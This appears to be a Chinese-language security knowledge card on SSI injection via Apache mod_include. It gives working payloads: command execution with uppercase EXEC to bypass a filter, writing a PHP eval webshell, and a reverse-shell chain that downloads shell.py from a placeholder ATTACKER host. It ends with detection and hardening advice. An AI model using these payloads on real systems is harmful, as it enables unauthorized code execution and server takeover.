---
id: web-php-rce-ssi-injection-user-input-exec
title: SSI 注入：用户输入落入 mod_include 解析页面，用 <!--#EXEC cmd--> 执行命令并以大小写绕过小写过滤
type: scenario
domain: web
path: web/php/rce
technique: ssi-injection-user-input-exec
aliases:
- SSI 注入
- Server Side Includes 注入
- shtml 注入
- EXEC 大小写绕过
- mod_include RCE
- SSI 命令执行
tags:
- ssi
- server-side-include
- shtml
- mod_include
- apache
- rce
- filter-bypass
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V615
  verified_at: '2026-11-12T20:44:13+08:00'
  notes: '已对照原文《SSI攻防技术简易刨析》全文与49张截图逐条核对：feedback 注入点、#echo DOCUMENT_NAME/DATE_LOCAL/REMOTE_ADDR、EXEC 大写绕过、写 a.php+蚁剑、nc 无 -e 后 python meterpreter 反弹均与图02-31、46-49一致；PoC 与截图一致。原文未给受影响版本区间（Apache/2.4.25 仅为靶场环境），未设 versions。dedup 与 web-php-rce-htaccess-ssi-includes-exec 为 related（入口与前置不同，非同链），保留。已修正原理中“SSI 指令大小写敏感”的错误表述为 mod_include 指令名大小写不敏感（EXEC 等价 exec），并注明 Nginx SSI 不支持 #exec。未在本机复现。'
---

## 一句话结论

当用户输入被写进一个随后由 Apache mod_include（或支持 `#exec` 的 IIS ServerSideIncludeModule；Nginx ngx_http_ssi_module 仅支持 include/echo 等指令、不支持 `#exec`）解析的页面（如 `.shtml`）时，提交 `<!--#EXEC cmd="whoami" -->` 即可让服务器执行系统命令并把输出回显到页面；若后端只过滤小写 `exec`，改用大写 `EXEC` 即可绕过，进而写 WebShell 或反弹 shell。

## 原理

- SSI（Server Side Includes）是 Web 服务器在返回页面前的服务端指令解析能力，语法为 `<!--#command param="value"-->`，`<!--` 与 `#` 之间不能有空格。Apache mod_include 的指令名大小写不敏感（大写 `EXEC` 与 `exec` 等价，这也正是绕过只匹配小写过滤器的基础），而 `#echo var=` 引用的变量名区分大小写。
- 常用指令：`#exec cmd="..."` 执行系统命令并回显 stdout；`#include file/virtual` 包含文件；`#echo var="..."` 输出 `DOCUMENT_NAME`、`DATE_LOCAL`、`REMOTE_ADDR` 等服务器变量；`#fsize`/`#flastmod` 读取文件属性；`#config`、`#if`、`#for` 做配置与逻辑。
- 漏洞成因：应用把用户可控内容写入或被包含进 SSI 解析的文件（回显到 `.shtml`、留言板写入 `receipt.shtml` 等），且没有对 `<!--`、`#`、`exec` 等做过滤；服务器端看到的是合法 SSI 指令，按自身权限执行。
- 为什么 WAF/过滤器常失效：mod_include 指令名大小写不敏感，只匹配小写 `exec` 的过滤器可被 `EXEC` 绕过；`#exec cmd` 的引号内命令不受 SQL/XSS 过滤器约束，且执行主体是 Web 服务器子进程，不受 PHP `disable_functions` 限制。
- 常见业务面：访客 IP、当前时间、定位信息、文件大小/修改时间等动态片段，很多站点用 SSI 来渲染；存在 `.shtml/.shtm/.stm` 文件是重要线索，但后缀并非强制，不能因未发现 `.shtml` 就排除。

## 触发条件

- Web 服务器启用 SSI 且支持 `#exec`（Apache `Options +Includes` + `AddOutputFilter INCLUDES`，IIS `ServerSideIncludeModule`；Nginx `ssi on` 仅支持 include/echo 等指令，不支持 `#exec`）。
- 用户输入被返回在会被 SSI 解析的页面中，或被写入/包含进此类文件。
- 输入未过滤或过滤不严（尤其只过滤小写 `exec`）。
- 攻击者可以访问渲染后的页面观察回显。

## 利用步骤

1. 识别 SSI：目录扫描发现 `.shtml/.shtm/.stm`，或页面源码中出现 `<!--#echo`、`<!--#include` 等指令。
2. 找到回显点：对表单/参数逐项 Fuzzing，提交 `<!--#EXEC cmd="whoami" -->`，观察哪个参数的结果出现在页面并被执行。
3. 验证回显与环境：提交 `<!--#echo var="DOCUMENT_NAME"-->`、`DATE_LOCAL`、`REMOTE_ADDR` 读取服务器变量；用 `<!--#EXEC cmd="ls -al"-->` 列目录。
4. 绕过过滤：若小写 `exec` 返回 `[an error occurred while processing this directive]`，改用 `EXEC`、`Exec` 等大小写变体。
5. Getshell：提交 `<!--#EXEC cmd="echo '<?php eval($_POST[c]);?>' > a.php"-->` 写 PHP 马，再用蚁剑连接；或写 JSP/ASP 马（按目标语言）。
6. 反弹 shell：目标 netcat 无 `-e` 时，用 msfvenom 生成 python meterpreter，`wget` 下载、`chmod 777`、`python shell.py` 执行，在 handler 收会话；也可用 bash `/dev/tcp`、socat 等替代。

## PoC

最小验证：

```html
<!--#EXEC cmd="whoami" -->
```

回显服务器变量：

```html
<!--#echo var="DOCUMENT_NAME"-->
<!--#echo var="DATE_LOCAL"-->
<!--#echo var="REMOTE_ADDR"-->
```

写 WebShell：

```html
<!--#EXEC cmd="echo '<?php eval($_POST[c]);?>' > a.php"-->
```

反弹 shell（nc 无 -e 时的替代链）：

```html
<!--#EXEC cmd="wget http://ATTACKER:1234/shell.py"-->
<!--#EXEC cmd="chmod 777 shell.py"-->
<!--#EXEC cmd="python shell.py"-->
```

说明：payload 需放在会被 SSI 解析的输入点（如反馈/回执参数）；大写 `EXEC` 用于绕过只匹配小写的过滤器。PoC 为靶场流程的结构化复现，未在本机执行，仅用于授权测试。

## 变体与关联

- 变体：`#include file="/etc/passwd"` 或 `#include virtual="/..."` 读取文件；`#fsize`/`#flastmod` 做文件存在性与属性探测。
- 变体：上传一个 `.shtml` 页面利用已开启的 SSI（见关联的文件上传卡）；或通过 `.htaccess` 打开 SSI 再上传。
- 关联：[[web-php-rce-htaccess-ssi-includes-exec]]（上传页面 + .htaccess 开 SSI）、[[web-generic-file-upload-shtml-apache-ssi-exec]]（上传 .shtml 借既有 SSI 配置执行）、[[web-generic-ssti]]（同为服务端模板/指令注入的通用思路）。
- 边界：服务器未启用 SSI、输入被严格过滤 `<!--`、`#`、`exec`、或输出页面不被 SSI 解析时，本链不成立。

## 检测与防御

- 检测：请求体/参数中出现 `<!--#`、`#exec`、`#include`、`EXEC cmd`；响应出现命令输出或 `[an error occurred while processing this directive]`；Web 服务器子进程创建异常（尤其 www-data 启动 shell/wget/python）。
- 防御：不使用 SSI 时关闭 `Options +Includes`/`ssi on`/`ServerSideIncludeModule`；必须使用时对用户输入过滤 `<`、`>`、`#`、`-`、引号并拒绝 `<!--#`；上传目录禁止 SSI 解析；以最小权限运行 Web 服务器，限制其可执行命令与网络出口。
- 加固：WAF 同时匹配大小写变体与编码变体；对 `.shtml` 输出做转义；监控 Web 进程派生 shell 的行为。
